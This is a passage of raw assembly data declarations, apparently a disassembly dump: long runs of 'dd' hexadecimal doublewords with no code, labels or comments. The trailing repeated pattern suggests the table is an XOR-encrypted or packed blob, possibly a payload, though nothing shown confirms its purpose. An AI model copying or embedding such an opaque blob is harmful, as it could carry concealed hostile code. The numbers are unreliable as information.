		dd 0D5F6F856h, 3FAB133Ch, 0C3866BF6h, 0D33D3ABDh, 3DEDAD65h
		dd 0CB5EF8A5h, 0D8617D80h, 35353E36h, 0C91846FCh, 0DEAABF6Bh
		dd 307A28B3h, 0CFD38417h, 0DCEC0132h, 24841890h, 0D8A9605Ah
		dd 0C8123111h, 26C2A6C9h, 0DE62A2B1h, 0CD5D2794h, 20096422h
		dd 0DC241CE8h, 0C585B4C7h, 2B55231Fh, 0D4FC8FBBh, 0C7C30A9Eh
		dd 2D9EE1F4h, 0D1B3993Eh, 0C108C875h, 2FD85FADh, 8D9A623Dh
		dd 9EA5E718h, 73F1A4AEh, 8FDCDC64h, 986E25F3h, 76BEB22Bh
		dd 89171E8Fh, 9A289BAAh, 7E662178h, 824B59B2h, 92F008F9h
		dd 7C209F21h, 84809B59h, 97BF1E7Ch, 7AEB5DCAh, 86C62500h
		dd 83412E5Fh, 6D91B987h, 92381523h, 81079006h, 6B5A7B6Ch
		dd 977703A6h, 87CC52EDh, 691CC535h, 9FAF90F5h, 8C9015D0h
		dd 61C45666h, 9DE92EACh, 8A5BD73Bh, 648B40E3h, 9B22EC47h
		dd 881D6962h, 48383620h, 0B4154EEAh, 0A4AE1FA1h, 4A7E8879h
		dd 0B2DE8C01h, 0A1E10924h
		dd 4CB54A92h, 0B0983258h, 0A9399A77h, 47E90DAFh, 0B840A10Bh
		dd 0AB7F242Eh, 4122CF44h, 0BD0FB78Eh, 0ADB4E6C5h, 4364711Dh
		dd 0A9F187ADh, 0BACE0288h, 579A413Eh, 0ABB739F4h, 0BC05C063h
		dd 52D557BBh, 0AD7CFB1Fh, 0BE437E3Ah, 5A0DC4E8h, 0A620BC22h
		dd 0B69BED69h, 584B7AB1h, 0A0EB7EC9h, 0B3D4FBECh, 5E80B85Ah
		dd 0A2ADC090h, 0EC81B6Fh, 0E0188CB7h, 1FB12013h, 0C8EA536h
		dd 0E6D34E5Ch, 1AFE3696h, 0A4567DDh, 0E495F005h, 1226A5C5h
		dd 11920E0h, 0EC4D6356h, 10601B9Ch, 7D2E20Bh, 0E90275D3h
		dd 16ABD977h, 5945C52h,	0FDFC45F0h, 1D13D3Ah, 116A6C71h
		dd 0FFBAFBA9h, 71AFFD1h, 14257AF4h, 0F9713942h,	55C4188h
		dd 1CFDE9A7h, 0F22D7E7Fh, 0D84D2DBh, 1EBB57FEh,	0F4E6BC94h
		dd 8CBC45Eh, 18709515h,	0F6A002CDh, 2478B29Dh, 374737B8h
		dd 0DA13740Eh, 263E0CC4h, 318CF553h, 0DF5C628Bh, 20F5CE2Fh
		dd 33CA4B0Ah, 0D784F1D8h, 2BA98912h, 3B12D859h,	0D5C24F81h
		dd 2D624BF9h, 3E5DCEDCh, 0D3098D6Ah, 2F24F5A0h,	2AA3FEFFh
		dd 0C4736927h, 3BDAC583h, 28E540A6h, 0C2B8ABCCh, 3E95D306h
		dd 2E2E824Dh, 0C0FE1595h, 364D4055h, 2572C570h,	0C82686C6h
		dd 340BFE0Ch, 23B9079Bh, 0CD699043h, 32C03CE7h,	21FFB9C2h
		dd 91406B40h, 6D6D138Ah, 7DD642C1h, 9306D519h, 6BA6D161h
		dd 78995444h, 95CD17F2h, 69E06F38h, 7041C717h, 9E9150CFh
		dd 6138FC6Bh, 7207794Eh, 985A9224h, 6477EAEEh, 74CCBBA5h
		dd 9A1C2C7Dh, 7089DACDh, 63B65FE8h, 8EE21C5Eh, 72CF6494h
		dd 657D9D03h, 8BAD0ADBh, 7404A67Fh, 673B235Ah, 83759988h
		dd 7F58E142h, 6FE3B009h, 813327D1h, 799323A9h, 6AACA68Ch
		dd 87F8E53Ah, 7BD59DF0h, 461FD04Fh, 0A8CF4797h,	5766EB33h
		dd 44596E16h, 0AE04857Ch, 5229FDB6h, 4292ACFDh,	0AC423B25h
		dd 5AF16EE5h, 49CEEBC0h, 0A49AA876h, 58B7D0BCh,	4F05292Bh
		dd 0A1D5BEF3h, 5E7C1257h, 4D439772h, 0B52B8ED0h, 4906F61Ah
		dd 59BDA751h, 0B76D3089h, 4FCD34F1h, 5CF2B1D4h,	0B1A6F262h
		dd 4D8B8AA8h, 542A2287h, 0BAFAB55Fh, 455319FBh,	566C9CDEh
		dd 0BC3177B4h, 401C0F7Eh, 50A75E35h, 0BE77C9EDh, 0FD00EFFDh
		dd 5741678Ah, 0AAE6358Bh, 0EFB54013h, 609F97B8h, 37310D32h
		dd 0D86BB021h, 722A3856h, 0C55BD5EFh, 8008A077h, 8040E08Bh
		dd 0D7EE7A01h, 0B7D65045h, 1D97D832h, 0E0308A33h, 0A563FFABh
		dd 0BFE45770h, 0E84ACDFAh, 71070E9h, 0AD51F89Eh, 0DF943DC8h
		dd 9AC74850h, 9A8F08ACh, 0CD219226h, 68AD908Dh,	0C2EC18FAh
		dd 3F4B4AFBh, 7A183F63h, 0F532E8C8h, 0A29C7242h, 4DC6CF51h
		dd 0E7874726h, 0A0DD523Eh, 0E58E27A6h, 0E5C6675Ah, 0B268FDD0h
		dd 0D250D794h, 78115FE3h, 85B60DE2h, 0C0E5787Ah, 8A7B873Eh
		dd 0DDD51DB4h, 328FA0A7h, 98CE28D0h, 0EA0BED86h, 0AF58981Eh
		dd 0AF10D8E2h, 0F8BE4268h, 0D2B175Ch, 0A76A9F2Bh, 5ACDCD2Ah
		dd 1F9EB8B2h, 90B46F19h, 0C71AF593h, 28404880h,	8201C0F7h
		dd 35702D4Eh, 702358D6h, 706B182Ah, 27C582A0h, 47FDA8E4h
		dd 0EDBC2093h, 101B7292h, 5548070Ah, 74E958D2h,	2347C258h
		dd 0CC1D7F4Bh, 665CF73Ch, 1499326Ah, 51CA47F2h,	5182070Eh
		dd 62C9D84h, 0A3A09F2Fh, 9E11758h, 0F4464559h, 0B11530C1h
		dd 3E3FE76Ah, 69917DE0h, 86CBC0F3h, 2C8A4884h, 0CBE2F2A2h
		dd 8EB1873Ah, 8EF9C7C6h, 0D9575D4Ch, 0B96F7708h, 132EFF7Fh
		dd 0EE89AD7Eh, 0ABDAD8E6h, 0E14427A2h, 0B6EABD28h, 59B0003Bh
		dd 0F3F1884Ch, 81344D1Ah, 0C4673882h, 0C42F787Eh, 9381E2F4h
		dd 0C62618FEh, 6C679089h, 91C0C288h, 0D493B710h, 5BB960BBh
		dd 0C17FA31h, 0E34D4722h, 490CCF55h, 0FE7D22ECh, 0BB2E5774h
		dd 0BB661788h, 0ECC88D02h, 8CF0A746h, 26B12F31h, 0DB167D30h
		dd 9E4508A8h, 84C2A073h, 0D36C3AF9h, 3C3687EAh,	96770F9Dh
		dd 0E4B2CACBh, 0A1E1BF53h, 0A1A9FFAFh, 0F6076525h, 538B678Eh
		dd 0F9CAEFF9h, 46DBDF8h, 413EC860h, 0CE141FCBh,	99BA8541h
		dd 76E03852h, 0DCA1B025h, 0EDB64B3Bh, 0A8E53EA3h, 0A8AD7E5Fh
		dd 0FF03E4D5h, 9F3BCE91h, 357A46E6h, 0C8DD14E7h, 8D8E617Fh
		dd 0C7109E3Bh, 90BE04B1h, 7FE4B9A2h, 0D5A531D5h, 0A760F483h
		dd 0E233811Bh, 0E27BC1E7h, 0B5D55B6Dh, 40400E59h, 0EA01862Eh
		dd 17A6D42Fh, 52F5A1B7h, 0DDDF761Ch, 8A71EC96h,	652B5185h
		dd 0CF6AD9F2h, 781B344Bh, 3D4841D3h, 3D00012Fh,	6AAE9BA5h
		dd 0A96B1E1h, 0A0D73996h, 5D706B97h, 18231E0Fh,	0A29619EAh
		dd 0F5388360h, 1A623E73h, 0B023B604h, 0C2E67352h, 87B506CAh
		dd 87FD4636h, 0D053DCBCh, 75DFDE17h, 0DF9E5660h, 22390461h
		dd 676A71F9h, 0E840A652h, 0BFEE3CD8h, 50B481CBh, 0FAF509BCh
		dd 1D9DB39Ah, 58CEC602h, 588686FEh, 0F281C74h, 6F103630h
		dd 0C551BE47h, 38F6EC46h, 7DA599DEh, 373B669Ah,	6095FC10h
		dd 8FCF4103h, 258EC974h, 574B0C22h, 121879BAh, 12503946h
		dd 45FEA3CCh, 8B4D01FBh, 210C898Ch, 0DCABDB8Dh,	99F8AE15h
		dd 16D279BEh, 417CE334h, 0AE265E27h, 467D650h, 0B3163BE9h
		dd 0F6454E71h, 0F60D0E8Dh, 0A1A39407h, 0C19BBE43h, 6BDA3634h
		dd 967D6435h, 0D32E11ADh, 0C9A9B976h, 9E0723FCh, 715D9EEFh
		dd 0DB1C1698h, 0A9D9D3CEh, 0EC8AA656h, 0ECC2E6AAh, 0BB6C7C20h
		dd 1EE07E8Bh, 0B4A1F6FCh, 4906A4FDh, 0C55D165h,	837F06CEh
		dd 0D4D19C44h, 3B8B2157h, 91CAA920h, 0D690BC38h, 93C3C9A0h
		dd 938B895Ch, 0C42513D6h, 0A41D3992h, 0E5CB1E5h, 0F3FBE3E4h
		dd 0B6A8967Ch, 0FC366938h, 0AB98F3B2h, 44C24EA1h, 0EE83C6D6h
		dd 9C460380h, 0D9157618h, 0D95D36E4h, 8EF3AC6Eh, 7B66F95Ah
		dd 0D127712Dh, 2C80232Ch, 69D356B4h, 0E6F9811Fh, 0B1571B95h
		dd 5E0DA686h, 0F44C2EF1h, 433DC348h, 66EB6D0h, 626F62Ch
		dd 51886CA6h, 31B046E2h, 9BF1CE95h, 66569C94h, 2305E90Ch
		dd 0EFFD00EFh, 96DFFA77h, 0D161E113h, 55AC0976h, 192B9007h
		dd 72F4858Dh, 0DA586306h, 0A37A999Eh, 0CF8834F3h, 4B45DC96h
		dd 1E0628E0h, 75D93D6Ah, 0C4B1B6E6h, 0BD934C7Eh, 0FA2D571Ah
		dd 7EE0BF7Fh, 64FF4A1Dh, 0F205F97h, 0A78CB91Ch,	0DEAE4384h
		dd 80D435E7h, 419DD82h,	515A29F4h, 3A853C7Eh, 0B9656CFCh
		dd 0C0479664h, 87F98D00h, 3346565h, 4FB3FC14h, 246CE99Eh
		dd 8CC00F15h, 0F5E2F58Dh, 352081C6h, 0B1ED69A3h, 0E4AE9DD5h
		dd 8F71885Fh, 3E1903D3h, 473BF94Bh, 85E22Fh, 84480A4Ah
		dd 0FA474835h, 91985DBFh, 3934BB34h, 401641ACh,	1E6C37CFh
		dd 9AA1DFAAh, 0CFE22BDCh, 0A43D3E56h, 43CDD9C9h, 3AEF2351h
		dd 7D513835h, 0F99CD050h, 0B51B4921h, 0DEC45CABh, 7668BA20h
		dd 0F4A40B8h, 63B8EDD5h, 0E77505B0h, 0B236F1C6h, 0D9E9E44Ch
		dd 68816FC0h, 11A39558h, 561D8E3Ch, 0D2D06659h,	90AE2176h
		dd 0FB7134FCh, 53DDD277h, 2AFF28EFh, 74855E8Ch,	0F048B6E9h
		dd 0A50B429Fh, 0CED45715h, 4D340797h, 3416FD0Fh, 73A8E66Bh
		dd 0F7650E0Eh, 0BBE2977Fh, 0D03D82F5h, 7891647Eh, 1B39EE6h
		dd 9518496h, 8D9C6CF3h,	0D8DF9885h, 0B3008D0Fh,	2680683h
		dd 7B4AFC1Bh, 3CF4E77Fh, 0B8390F1Ah, 0C6364D65h, 0ADE958EFh
		dd 545BE64h, 7C6744FCh,	221D329Fh, 0A6D0DAFAh, 0F3932E8Ch
		dd 984C3B06h, 0B79CB2A2h, 0CEBE483Ah, 8900535Eh, 0DCDBB3Bh
		dd 414A224Ah, 2A9537C0h
		dd 8239D14Bh, 0FB1B2BD3h, 97E986BEh, 13246EDBh,	46679AADh
		dd 2DB88F27h, 9CD004ABh, 0E5F2FE33h, 0A24CE557h, 26810D32h
		dd 3C9EF850h, 5741EDDAh, 0FFED0B51h, 86CFF1C9h,	0D8B587AAh
		dd 5C786FCFh, 93B9BB9h,	62E48E33h, 0E104DEB1h, 98262429h
		dd 0DF983F4Dh, 5B55D728h, 17D24E59h, 7C0D5BD3h,	0D4A1BD58h
		dd 0AD8347C0h, 0DD835710h, 594EBF75h, 0C0D4B03h, 67D25E89h
		dd 0D6BAD505h, 0AF982F9Dh, 0E82634F9h, 6CEBDC9Ch, 12E49EE3h
		dd 793B8B69h, 0D1976DE2h, 0A8B5977Ah, 0F6CFE119h, 7202097Ch
		dd 2741FD0Ah, 4C9EE880h, 0AB6E0F1Fh, 0D24CF587h, 95F2EEE3h
		dd 113F0686h, 5DB89FF7h, 36678A7Dh, 9ECB6CF6h, 0E7E9966Eh
		dd 8B1B3B03h, 0FD6D366h, 5A952710h, 314A329Ah, 8022B916h
		dd 0F900438Eh, 0BEBE58EAh, 3A73B08Fh, 0E84C2BD6h, 83933E5Ch
		dd 2B3FD8D7h, 521D224Fh, 0C67542Ch, 88AABC49h, 0DDE9483Fh
		dd 0B6365DB5h, 35D60D37h, 4CF4F7AFh, 0B4AECCBh,	8F8704AEh
		dd 0C3009DDFh, 0A8DF8855h, 736EDEh, 79519446h, 71B38E36h
		dd 0F57E6653h, 0A03D9225h, 0CBE287AFh, 7A8A0C23h, 3A8F6BBh
		dd 4416EDDFh, 0C0DB05BAh, 0BED447C5h, 0D50B524Fh, 7DA7B4C4h
		dd 4854E5Ch, 5AFF383Fh,	0DE32D05Ah, 8B71242Ch, 0E0AE31A6h
		dd 5F3F6474h, 261D9EECh, 61A38588h, 0E56E6DEDh,	0A9E9F49Ch
		dd 0C236E116h, 6A9A079Dh, 13B8FD05h, 7F4A5068h,	0FB87B80Dh
		dd 0AEC44C7Bh, 0C51B59F1h, 7473D27Dh, 0D5128E5h, 4AEF3381h
		dd 0CE22DBE4h, 0D43D2E86h, 0BFE23B0Ch, 174EDD87h, 6E6C271Fh
		dd 3016517Ch, 0B4DBB919h, 0E1984D6Fh, 8A4758E5h, 9A70867h
		dd 7085F2FFh, 373BE99Bh, 0B3F601FEh, 0FF71988Fh, 94AE8D05h
		dd 3C026B8Eh, 45209116h, 85E2E55Dh, 12F0D38h, 546CF94Eh
		dd 3FB3ECC4h, 8EDB6748h, 0F7F99DD0h, 0B04786B4h, 348A6ED1h
		dd 4A852CAEh, 215A3924h, 89F6DFAFh, 0F0D42537h,	0AEAE5354h
		dd 2A63BB31h, 7F204F47h, 14FF5ACDh, 0F30FBD52h,	8A2D47CAh
		dd 0CD935CAEh, 495EB4CBh, 5D92DBAh, 6E063830h, 0C6AADEBBh
		dd 0BF882423h, 0D37A894Eh, 57B7612Bh, 2F4955Dh,	692B80D7h
		dd 0D8430B5Bh, 0A161F1C3h, 0E6DFEAA7h, 621202C2h, 0EFFD00h
		dd 0BC31F4E4h, 6D9F36DDh, 0C3BCD02Bh, 0F9C58399h, 0AA097792h
		dd 8648A756h, 3A96AEB2h, 0E777D927h, 49543FD1h,	77E80007h
		dd 2424F40Ch, 0CA048ACh, 0B07E4148h, 61D08371h,	0CFF36587h
		dd 0AC122DB7h, 0FFDED9BCh, 0D39F0978h, 6F41009Ch, 0BA2AAEC1h
		dd 14094837h, 2AB577E1h, 797983EAh, 5977E682h, 0E5A9EF66h
		dd 34072D5Fh, 9A24CBA9h, 0A05D981Bh, 0F3916C10h, 0DFD0BCD4h
		dd 630EB530h, 4DD9847Ah, 0E3FA628Ch, 0DD465D5Ah, 8E8AA951h
		dd 0A60E15F1h, 1AD01C15h, 0CB7EDE2Ch, 655D38DAh, 57AEB2A0h
		dd 46246ABh, 2823966Fh,	94FD9F8Bh, 419631D6h, 0EFB5D720h
		dd 0D109E8F6h, 82C51CFDh, 0F3D9BBDFh, 4F07B23Bh, 9EA97002h
		dd 308A96F4h, 0AF3C546h, 593F314Dh, 757EE189h, 0C9A0E86Dh
		dd 14419FF8h, 0BA62790Eh, 84DE46D8h, 0D712B2D3h, 0FF960E73h
		dd 43480797h, 92E6C5AEh, 3CC52358h, 0F84F960Dh,	0AB836206h
		dd 87C2B2C2h, 3B1CBB26h, 0EE77157Bh, 4054F38Dh,	7EE8CC5Bh
		dd 2D243850h, 0D2A5D38h, 0B1F454DCh, 605A96E5h,	0CE797013h
		dd 0F40023A1h, 0A7CCD7AAh, 8B8D076Eh, 37530E8Ah, 0BBA0BB55h
		dd 15835DA3h, 2B3F6275h, 78F3967Eh, 50772ADEh, 0ECA9233Ah
		dd 3D07E103h, 932407F5h, 0A1D78D8Fh, 0F21B7984h, 0DE5AA940h
		dd 6284A0A4h, 0B7EF0EF9h, 19CCE80Fh, 2770D7D9h,	74BC23D2h
		dd 0A7840065h, 1B5A0981h, 0CAF4CBB8h, 64D72D4Eh, 5EAE7EFCh
		dd 0D628AF7h, 21235A33h, 9DFD53D7h, 401C2442h, 0EE3FC2B4h
		dd 0D083FD62h, 834F0969h, 0ABCBB5C9h, 1715BC2Dh, 0C6BB7E14h
		dd 689898E2h, 0B79D0D2h, 58B524D9h, 74F4F41Dh, 0C82AFDF9h
		dd 1D4153A4h, 0B362B552h, 8DDE8A84h, 0DE127E8Fh, 0FE1C1BE7h
		dd 42C21203h, 936CD03Ah, 3D4F36CCh, 736657Eh, 54FA9175h
		dd 78BB41B1h, 0C4654855h, 0A46583D4h, 0A466522h, 34FA5AF4h
		dd 6736AEFFh, 4FB2125Fh, 0F36C1BBBh, 22C2D982h,	8CE13F74h
		dd 0BE12B50Eh, 0EDDE4105h, 0C19F91C1h, 7D419825h, 0A82A3678h
		dd 609D08Eh, 38B5EF58h,	6B791B53h, 1A65BC71h, 0A6BBB595h
		dd 771577ACh, 0D936915Ah, 0E34FC2E8h, 0B08336E3h, 9CC2E627h
		dd 201CEFC3h, 0FDFD9856h, 53DE7EA0h, 6D624176h,	3EAEB57Dh
		dd 162A09DDh, 0AAF40039h, 7B5AC200h, 0D57924F6h, 14BCE853h
		dd 47701C58h, 6B31CC9Ch, 0D7EFC578h, 2846B25h, 0ACA78DD3h
		dd 921BB205h, 0C1D7460Eh, 0E1D92366h, 5D072A82h, 8CA9E8BBh
		dd 228A0E4Dh, 18F35DFFh, 4B3FA9F4h, 677E7930h, 0DBA070D4h
		dd 5753C50Bh, 0F97023FDh, 0C7CC1C2Bh, 9400E820h, 0BC845480h
		dd 5A5D64h, 0D1F49F5Dh,	7FD779ABh, 4D24F3D1h, 1EE807DAh
		dd 32A9D71Eh, 8E77DEFAh, 5B1C70A7h, 0F53F9651h,	0CB83A987h
		dd 984F5D8Ch, 4E3807CBh, 0F2E60E2Fh, 2348CC16h,	8D6B2AE0h
		dd 0B7127952h, 0E4DE8D59h, 0C89F5D9Dh, 74415479h, 0A9A023ECh
		dd 783C51Ah, 393FFACCh,	6AF30EC7h, 4277B267h, 0FEA9BB83h
		dd 2F0779BAh, 81249F4Ch, 0E2C5D77Ch, 0B1092377h, 9D48F3B3h
		dd 2196FA57h, 0F4FD540Ah, 5ADEB2FCh, 64628D2Ah,	37AE7921h
		dd 17A01C49h, 0AB7E15ADh, 7AD0D794h, 0D4F33162h, 0EE8A62D0h
		dd 0BD4696DBh, 9107461Fh, 2DD94FFBh, 30E7EB1h, 0AD2D9847h
		dd 9391A791h, 0C05D539Ah, 0E8D9EF3Ah, 5407E6DEh, 85A924E7h
		dd 2B8AC211h, 1979486Bh, 4AB5BC60h, 66F46CA4h, 0DA2A6540h
		dd 0F41CB1Dh, 0A1622DEBh, 9FDE123Dh, 0CC12E636h, 0BD0E4114h
		dd 1D048F0h, 0D07E8AC9h, 7E5D6C3Fh, 44243F8Dh, 17E8CB86h
		dd 3BA91B42h, 877712A6h, 5A966533h, 0F4B583C5h,	0CA09BC13h
		dd 99C54818h, 0B141F4B8h, 0D9FFD5Ch, 0DC313F65h, 7212D993h
		dd 0FD00EFFDh, 0D897C2EEh, 6E3B7903h, 0A4BEA9FFh, 335509E8h
		dd 0EB2D3606h, 4F7C62F9h, 6AEB4FEAh, 0B8BEEE0Eh, 723B3EF2h
		dd 397897E2h, 0E100A80Ch, 99F9F5F4h, 0BC6ED8E7h, 0AC2630Ah
		dd 0C047B3F6h, 9F5E26F3h, 4726191Dh, 0E3774DE2h, 0C6E060F1h
		dd 0ACE4D21Bh, 666102E7h, 2D22ABF7h, 0F55A9419h, 35F2DAEFh
		dd 1065F7FCh, 0A6C94C11h, 6C4C9CEDh, 0FBA73CFAh, 23DF0314h
		dd 878E57EBh, 0A2197AF8h, 0E0A9B038h, 2A2C60C4h, 616FC9D4h
		dd 0B917F63Ah, 0C1EEABC2h, 0E47986D1h, 52D53D3Ch, 9850EDC0h
		dd 0B7EA5ED9h, 6F926137h, 0CBC335C8h, 0EE5418DBh, 8450AA31h
		dd 4ED57ACDh, 596D3DDh,	0DDEEEC33h, 6DE584D9h, 4872A9CAh
		dd 0FEDE1227h, 345BC2DBh, 0A3B062CCh, 7BC85D22h, 0DF9909DDh
		dd 0FA0E24CEh, 285B852Ah, 0E2DE55D6h, 0A99DFCC6h, 71E5C328h
		dd 91C9ED0h, 2C8BB3C3h,	9A27082Eh, 50A2D8D2h, 2F709A9Fh
		dd 0F708A571h, 5359F18Eh, 76CEDC9Dh, 1CCA6E77h,	0D64FBE8Bh
		dd 9D0C179Bh, 45742875h, 85DC6683h, 0A04B4B90h,	16E7F07Dh
		dd 0DC622081h, 4B898096h, 93F1BF78h, 37A0EB87h,	1237C694h
		dd 0B0C1416Ch, 7A449190h, 31073880h, 0E97F076Eh, 91865A96h
		dd 0B4117785h, 2BDCC68h, 0C8381C94h, 0E782AF8Dh, 3FFA9063h
		dd 9BABC49Ch, 0BE3CE98Fh, 0D4385B65h, 1EBD8B99h, 55FE2289h
		dd 8D861D67h, 0DDCB38B5h, 0F85C15A6h, 4EF0AE4Bh, 84757EB7h
		dd 139EDEA0h, 0CBE6E14Eh
		dd 6FB7B5B1h, 4A2098A2h, 98753946h, 52F0E9BAh, 19B340AAh
		dd 0C1CB7F44h, 0B93222BCh, 9CA50FAFh, 2A09B442h, 0E08C64BEh
		dd 0BF95F1BBh, 67EDCE55h, 0C3BC9AAAh, 0E62BB7B9h, 8C2F0553h
		dd 46AAD5AFh, 0DE97CBFh, 0D5914351h, 15390DA7h,	30AE20B4h
		dd 86029B59h, 4C874BA5h, 0DB6CEBB2h, 314D45Ch, 0A74580A3h
		dd 82D2ADB0h, 80F4C8E1h, 4A71181Dh, 132B10Dh, 0D94A8EE3h
		dd 0A1B3D31Bh, 8424FE08h, 328845E5h, 0F80D9519h, 0D7B72600h
		dd 0FCF19EEh, 0AB9E4D11h, 8E096002h, 0E40DD2E8h, 2E880214h
		dd 65CBAB04h, 0BDB394EAh, 0DB8FC00h, 282FD113h,	9E836AFEh
		dd 5406BA02h, 0C3ED1A15h, 1B9525FBh, 0BFC47104h, 9A535C17h
		dd 4806FDF3h, 82832D0Fh, 0C9C0841Fh, 11B8BBF1h,	6941E609h
		dd 4CD6CB1Ah, 0FA7A70F7h, 30FFA00Bh, 8FA07836h,	57D847D8h
		dd 0F3891327h, 0D61E3E34h, 0BC1A8CDEh, 769F5C22h, 3DDCF532h
		dd 0E5A4CADCh, 250C842Ah, 9BA939h, 0B63712D4h, 7CB2C228h
		dd 0EB59623Fh, 33215DD1h, 9770092Eh, 0B2E7243Dh, 1011A3C5h
		dd 0DA947339h, 91D7DA29h, 49AFE5C7h, 3156B83Fh,	14C1952Ch
		dd 0A26D2EC1h, 68E8FE3Dh, 47524D24h, 9F2A72CAh,	3B7B2635h
		dd 1EEC0B26h, 74E8B9CCh, 0BE6D6930h, 0F52EC020h, 2D56FFCEh
		dd 0BD96406Ch, 98016D7Fh, 2EADD692h, 0E428066Eh, 73C3A679h
		dd 0ABBB9997h, 0FEACD68h, 2A7DE07Bh, 0F828419Fh, 32AD9163h
		dd 79EE3873h, 0A196079Dh, 0D96F5A65h, 0FCF87776h, 4A54CC9Bh
		dd 80D11C67h, 0DFC88962h, 7B0B68Ch, 0A3E1E273h,	8676CF60h
		dd 0EC727D8Ah, 26F7AD76h, 6DB40466h, 0B5CC3B88h, 7564757Eh
		dd 50F3586Dh, 0E65FE380h, 2CDA337Ch, 0BB31936Bh, 6349AC85h
		dd 0C718F87Ah, 0E28FD569h, 0A03F1FA9h, 6ABACF55h, 21F96645h
		dd 0F98159ABh, 81780453h, 0A4EF2940h, 124392ADh, 0D8C64251h
		dd 0F77CF148h, 2F04CEA6h, 8B559A59h, 0AEC2B74Ah, 0C4C605A0h
		dd 0E43D55Ch, 45007C4Ch, 9D7843A2h, 2D732B48h, 8E4065Bh
		dd 0BE48BDB6h, 74CD6D4Ah, 0E326CD5Dh, 3B5EF2B3h, 9F0FA64Ch
		dd 0BA988B5Fh, 68CD2ABBh, 0A248FA47h, 0E90B5357h, 31736CB9h
		dd 498A3141h, 6C1D1C52h, 0DAB1A7BFh, 10347743h,	0EFFD00EFh
		dd 658841B8h, 76C8E657h, 152B5FDh, 57789F8Fh, 0CFF031CAh
		dd 33A26BCAh, 0B9D72A9Dh, 12285B38h, 65B20892h,	640F406Fh
		dd 0FC87EE2Ah, 5742D6A5h, 0DD3797F2h, 0CE77301Dh, 0B9ED63B7h
		dd 9FB8E450h, 7304A15h,	0FB621015h, 71175142h, 35C09422h
		dd 425AC788h, 43E78F75h, 0DB6F2130h, 9F82AD7Ah,	15F7EC2Dh
		dd 6B74BC2h, 712D1868h,	2707321Ah, 0BF8F9C5Fh, 43DDC65Fh
		dd 0C9A88708h, 0C3AFDD5Dh, 0B4358EF7h, 0B588C60Ah, 2D00684Fh
		dd 86C550C0h, 0CB01197h, 1FF0B678h, 686AE5D2h, 0D1687B65h
		dd 49E0D520h, 0B5B28F20h, 3FC7CE77h, 7B100B17h,	0C8A58BDh
		dd 0D371040h, 95BFBE05h, 4E052B1Fh, 0C4706A48h,	0D730CDA7h
		dd 0A0AA9E0Dh, 0F680B47Fh, 6E081A3Ah, 925A403Ah, 182F016Dh
		dd 0B3D070C8h, 0C44A2362h, 0C5F76B9Fh, 5D7FC5DAh, 0F6BAFD55h
		dd 7CCFBC02h, 6F8F1BEDh, 18154847h, 3DB7E99Bh, 0A53F47DEh
		dd 596D1DDEh, 0D3185C89h, 97CF99E9h, 0E055CA43h, 0E1E882BEh
		dd 79602CFBh, 3D8DA0B1h, 0B7F8E1E6h, 0A4B84609h, 0D32215A3h
		dd 85083FD1h, 1D809194h, 0E1D2CB94h, 6BA78AC3h,	5F0FE236h
		dd 2895B19Ch, 2928F961h, 0B1A05724h, 1A656FABh,	90102EFCh
		dd 83508913h, 0F4CADAB9h, 4DC8440Eh, 0D540EA4Bh, 2912B04Bh
		dd 0A367F11Ch, 0E7B0347Ch, 902A67D6h, 91972F2Bh, 91F816Eh
		dd 0EC0A26D4h, 667F6783h, 753FC06Ch, 2A593C6h, 548FB9B4h
		dd 0CC0717F1h, 30554DF1h, 0BA200CA6h, 11DF7D03h, 66452EA9h
		dd 67F86654h, 0FF70C811h, 54B5F09Eh, 0DEC0B1C9h, 0CD801626h
		dd 0BA1A458Ch, 9C4FC26Bh, 4C76C2Eh, 0F895362Eh,	72E07779h
		dd 3637B219h, 41ADE1B3h, 4010A94Eh, 0D898070Bh,	9C758B41h
		dd 1600CA16h, 5406DF9h,	72DA3E53h, 24F01421h, 0BC78BA64h
		dd 402AE064h, 0CA5FA133h, 0C6B6B610h, 0B12CE5BAh, 0B091AD47h
		dd 28190302h, 83DC3B8Dh, 9A97ADAh, 1AE9DD35h, 6D738E9Fh
		dd 0D4711028h, 4CF9BE6Dh, 0B0ABE46Dh, 3ADEA53Ah, 7E09605Ah
		dd 99333F0h, 82E7B0Dh, 90A6D548h, 4B1C4052h, 0C1690105h
		dd 0D229A6EAh, 0A5B3F540h, 0F399DF32h, 6B117177h, 97432B77h
		dd 1D366A20h, 0B6C91B85h, 0C153482Fh, 0C0EE00D2h, 5866AE97h
		dd 0F3A39618h, 79D6D74Fh, 6A9670A0h, 1D0C230Ah,	5F6964Dh
		dd 9D7E3808h, 612C6208h, 0EB59235Fh, 0AF8EE63Fh, 0D814B595h
		dd 0D9A9FD68h, 4121532Dh, 5CCDF67h, 8FB99E30h, 9CF939DFh
		dd 0EB636A75h, 0BD494007h, 25C1EE42h, 0D993B442h, 53E6F515h
		dd 674E9DE0h, 10D4CE4Ah, 116986B7h, 89E128F2h, 2224107Dh
		dd 0A851512Ah, 0BB11F6C5h, 0CC8BA56Fh, 75893BD8h, 0ED01959Dh
		dd 1153CF9Dh, 9B268ECAh, 0DFF14BAAh, 0A86B1800h, 0A9D650FDh
		dd 315EFEB8h, 0E9134D99h, 63660CCEh, 7026AB21h,	7BCF88Bh
		dd 5196D2F9h, 0C91E7CBCh, 354C26BCh, 0BF3967EBh, 14C6164Eh
		dd 635C45E4h, 62E10D19h, 0FA69A35Ch, 51AC9BD3h,	0DBD9DA84h
		dd 0C8997D6Bh, 0BF032EC1h, 9956A926h, 1DE0763h,	0FD8C5D63h
		dd 77F91C34h, 332ED954h, 44B48AFEh, 4509C203h, 0DD816C46h
		dd 996CE00Ch, 1319A15Bh, 5906B4h, 77C3551Eh, 21E97F6Ch
		dd 0B961D129h, 45338B29h, 0CF46CA7Eh, 0C541902Bh, 0B2DBC381h
		dd 0B3668B7Ch, 2BEE2539h, 802B1DB6h, 0A5E5CE1h,	191EFB0Eh
		dd 6E84A8A4h, 0D7863613h, 4F0E9856h, 0B35CC256h, 39298301h
		dd 7DFE4661h, 0A6415CBh, 0BD95D36h, 9351F373h, 48EB6669h
		dd 0C29E273Eh, 0D1DE80D1h, 0A644D37Bh, 0F06EF909h, 68E6574Ch
		dd 94B40D4Ch, 1EC14C1Bh, 0B53E3DBEh, 0C2A46E14h, 0C31926E9h
		dd 5B9188ACh, 0F054B023h, 7A21F174h, 6961569Bh,	1EFB0531h
		dd 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh
		dd 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EEh, 0EFFD01h
